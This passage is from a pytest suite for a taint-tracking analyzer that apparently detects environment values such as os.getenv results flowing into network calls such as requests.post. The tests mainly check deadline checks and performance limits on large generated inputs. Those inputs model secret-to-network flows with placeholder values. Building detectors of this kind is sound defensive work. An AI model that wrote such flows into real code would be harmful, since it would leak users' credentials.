        one = many.replace(_ALL_SOURCES, "os.getenv('a')")
        # One fact per key and sink lane, however many sources reach the key.
        assert facts(many) == facts(one)

    def test_each_flow_fires_at_most_once_per_rank(self, monkeypatch) -> None:
        """Nested functions forwarding a parameter do not re-fire a wide assignment."""
        calls = {"n": 0}
        original = behavioral_taint_tracking._mark_targets

        def counting_mark_targets(*args, **kwargs):
            calls["n"] += 1
            return original(*args, **kwargs)

        code = _wide_assignment_in_nested_functions(2000)
        parsed = get_python_ast(None, code, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
        graph.build()
        flows = len(graph.flows) + len(graph.seeds)
        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
        _run(code)
        # Each flow fires at most once per (lane, source rank, bound or not):
        # fourteen times (three ranks in lanes 0 and 1, one in lane 2, two
        # slots), however many sources the forwarded value carries and however
        # deep it goes.
        assert calls["n"] <= 14 * flows

    def test_redefinitions_merge_into_one_class_and_one_callee(self) -> None:
        parsed = get_python_ast(None, _typed_redefinitions(500), "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        (cls,) = index.classes
        (group,) = cls.methods["m"].values()
        assert len(group.functions) == 500

    @staticmethod
    def _raised_in(code: str, cap: int, stage) -> list[str]:
        """Run *stage* with a deadline that expires after *cap* checks; return the stack."""
        parsed = get_python_ast(None, code, "t.py")
        with pytest.raises(_RuntimeBudgetError) as raised:
            stage(parsed, _capped_check_runtime(cap))
        return [frame.name for frame in __import__("traceback").extract_tb(raised.tb)]

    def test_deadline_is_checked_while_indexing(self) -> None:
        def index(parsed, check):
            behavioral_taint_tracking._build_scope_index(parsed.tree, check)

        stack = self._raised_in("x + 1\n" * 20000, 5000, index)
        assert "_build_scope_index" in stack
        # Name resolution alone also checks the deadline.
        names = "z = [" + ",".join(f"n{i}" for i in range(20000)) + "]\n"
        stack = self._raised_in(names, 25000, index)
        assert "_resolve_names" in stack

    def test_deadline_is_checked_per_statement(self) -> None:
        """Calls that bind nothing still pass a deadline check each."""
        parsed = get_python_ast(None, "class C:\n    pass\n" + "C()\n" * 20000, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        graph = behavioral_taint_tracking._TaintGraph(
            index, {}, parsed.import_aliases, _capped_check_runtime(5000)
        )
        with pytest.raises(_RuntimeBudgetError):
            graph.build()

    def test_deadline_is_checked_while_linking_callees(self) -> None:
        """Binding call-site slots into each callee's parameters checks the deadline."""
        functions = "".join(f"def f{i}(a, b, *c, d=1, **e):\n    return a\n" for i in range(3000))
        calls = "".join(f"f{i}(1, 2, 3, d=4, e=5)\n" for i in range(3000))
        parsed = get_python_ast(None, functions + calls, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
        for node, scope in index.statements:
            if isinstance(node, behavioral_taint_tracking.ast.Call):
                graph.call(node, scope)
        graph.tick = _capped_check_runtime(1000)
        with pytest.raises(_RuntimeBudgetError):
            graph.link_callees()

    def test_deadline_is_checked_while_propagating(self) -> None:
        depth = 20000
        code = (
            "import os\n"
            + "".join(f"a{i} = a{i - 1}\n" for i in range(depth, 0, -1))
            + 'a0 = os.getenv("K")\n'
        )
        parsed = get_python_ast(None, code, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
        graph.build()
        graph.tick = _capped_check_runtime(depth // 2)
        with pytest.raises(_RuntimeBudgetError):
            graph.propagate()

    @pytest.mark.parametrize(
        ("stage", "code", "limit"),
        [
            pytest.param(
                "_resolve_names",
                "x = (" + "lambda: 0, " * 3000 + ")\n",
                1000,
                id="resolve_per_scope",
            ),
            pytest.param(
                # One check per scope and one per definition: 6,001 in all.
                "_resolve_names",
                "def f():\n    pass\n" * 3000,
                4500,
                id="resolve_per_definition",
            ),
            pytest.param(
                "_index_definitions", "class C:\n    pass\n" * 3000, 1000, id="index_classes"
            ),
            pytest.param(
                "_index_definitions",
                "class D(" + ",".join(f"b{i}" for i in range(3000)) + "):\n    pass\n",
                1000,
                id="index_bases",
            ),
            pytest.param(
                "_index_definitions",
                "".join(f"def f{i}():\n    pass\n" for i in range(3000)),
                1000,
                id="index_functions",
            ),
            pytest.param(
                "_index_definitions",
                "=".join(f"a{i}" for i in range(3000)) + " = lambda: 0\n",
                1000,
                id="index_lambda_bindings",
            ),
            pytest.param(
                "ancestors",
                "class K0:\n    pass\n"
                + "".join(f"class K{i}(K{i - 1}):\n    pass\n" for i in range(1, 3000))
                + "class Leaf(K2999):\n    def go(self):\n        self.m()\n",
                1000,
                id="ancestors",
            ),
            pytest.param(
                "scan", "x = [" + ",".join(f"n{i}" for i in range(3000)) + "]\n", 1000, id="scan"
            ),
            pytest.param(
                # ``_mark_targets`` checks once per 1024 targets.
                "_mark_targets",
                "import os\n" + ",".join(f"t{i}" for i in range(40 * 1024)) + " = os.getenv('K')\n",
                20,
                id="mark_targets",
            ),
            pytest.param(
                "defaults",
                "def f(" + ",".join(f"a{i}=0" for i in range(3000)) + "):\n    pass\n",
                1000,
                id="defaults",
            ),
            pytest.param(
                "link_attributes",
                "class C:\n    def m(self):\n" + "        x = self.a\n" * 3000,
                1000,
                id="link_attribute_nodes",
            ),
            pytest.param(
                # One check per attribute and one per distinct ``self.x``: 6,000.
                "link_attributes",
                "class C:\n    def m(self):\n"
                + "".join(f"        x = self.a{i}\n" for i in range(3000)),
                4500,
                id="link_attribute_views",
            ),
            pytest.param(
                # One check per class-body read and one per statement: 6,000.
                "build",
                "class C:\n" + "".join(f"    x{i} = x{i}\n" for i in range(3000)),
                4500,
                id="build_class_reads",
            ),
            pytest.param(
                "build",
                "".join(f"def f{i}(a=0):\n    pass\n" for i in range(3000)),
                1000,
                id="build_functions",
            ),
            pytest.param(
                # One key read by 30,720 flows into one target: few pops.
                "drain",
                "import os\nx = os.getenv('K')\n" + "t = x\n" * (30 * 1024),
                20,
                id="drain_flows_of_one_key",
            ),
            pytest.param(
                "bind_arguments",
                "def f(*a):\n    pass\nf(" + "x, " * 3000 + ")\n",
                1000,
                id="bind_positional_arguments",
            ),
            pytest.param(
                "bind_arguments",
                "def f(**k):\n    pass\nf(" + "".join(f"k{i}=x, " for i in range(3000)) + ")\n",
                1000,
                id="bind_keywords",
            ),
            pytest.param(
                "propagate",
                "import os\n"
                + "".join(f"def f{i}():\n    return os.getenv('K')\n" for i in range(3000)),
                1000,
                id="propagate_seeds",
            ),
            pytest.param(
                "_find_tainted_names_in_args",
                "import requests\nrequests.post('u', data=["
                + ",".join("x" for _ in range(3000))
                + "])\n",
                1000,
                id="sink_arguments",
            ),
        ],
    )
    def test_deadline_is_checked_inside_each_stage(self, stage: str, code: str, limit: int) -> None:
        """Each stage checks the deadline in its own loops, not only between stages.

        The deadline here counts only the checks made by *stage* itself, and
        each input makes one of its loops do most of the work, so the test
        fails if that loop's check is removed.
        """
        calls = {"n": 0}

        def check_runtime() -> None:
            if sys._getframe(1).f_code.co_name == stage:
                calls["n"] += 1
                if calls["n"] > limit:
                    raise _RuntimeBudgetError(stage)

        budget = types.SimpleNamespace(
            check_runtime=check_runtime, emit=lambda finding: None, current_findings=[]
        )
        parsed = get_python_ast(None, code, "t.py")
        with pytest.raises(_RuntimeBudgetError, match=stage):
            behavioral_taint_tracking._analyze_python(parsed, "t.py", budget)
